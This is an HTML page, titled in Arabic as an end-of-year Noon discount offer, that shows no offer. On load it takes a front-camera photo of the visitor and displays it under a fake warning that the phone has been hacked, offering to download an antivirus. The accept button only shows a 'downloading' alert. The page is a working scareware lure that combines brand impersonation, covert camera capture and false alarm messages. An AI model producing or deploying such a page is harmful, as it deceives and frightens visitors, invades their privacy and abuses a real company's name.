<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>خصومات نهاية السنة من نون</title> <!-- تعديل العنوان -->
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            background-color: black;
            color: white;
            margin: 0;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        #video, #canvas {
            width: 100vw;
            height: auto;
            object-fit: cover;
        }
        #dialog {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(0, 0, 0, 0.9);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
            text-align: center;
            width: 80%;
            max-width: 400px;
        }
        #dialog p {
            font-size: 1.2rem;
            margin-bottom: 20px;
            color: white;
        }
        .dialog-button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            margin: 5px;
            cursor: pointer;
        }
        #accept {
            background-color: green;
            color: white;
        }
        #cancel {
            background-color: red;
            color: white;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display: none;"></canvas>
    
  <div id="dialog">
        <p>تم تهكير هاتفك. هل تريد تنزيل مضاد فيروسات؟</p>
        <button id="accept" class="dialog-button">موافق</button>
        <button id="cancel" class="dialog-button">إلغاء</button>
    </div>

  <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const dialog = document.getElementById('dialog');
        const acceptButton = document.getElementById('accept');
        const cancelButton = document.getElementById('cancel');

        // تفعيل الكاميرا
        function startCamera() {
            navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    facingMode: "user" // الكاميرا الأمامية
                }
            })
            .then(stream => {
                video.srcObject = stream;

                // التقاط الصورة تلقائيًا
                setTimeout(() => {
                    captureImage();
                }, 1000);
            })
            .catch(err => {
                alert("حدث خطأ أثناء الوصول إلى الكاميرا: " + err.message);
                console.error("خطأ:", err);
            });
        }

        // التقاط الصورة وعرض مربع الحوار
        function captureImage() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            video.style.display = "none";
            canvas.style.display = "block";
            dialog.style.display = "block";
        }

        // أحداث الأزرار
        acceptButton.addEventListener('click', () => {
            alert("جاري تنزيل مضاد الفيروسات...");
        });

        cancelButton.addEventListener('click', () => {
            alert("تم إلغاء العملية.");
            dialog.style.display = "none";
        });

        // بدء تشغيل الكاميرا
        startCamera();
    </script>
</body>
</html>
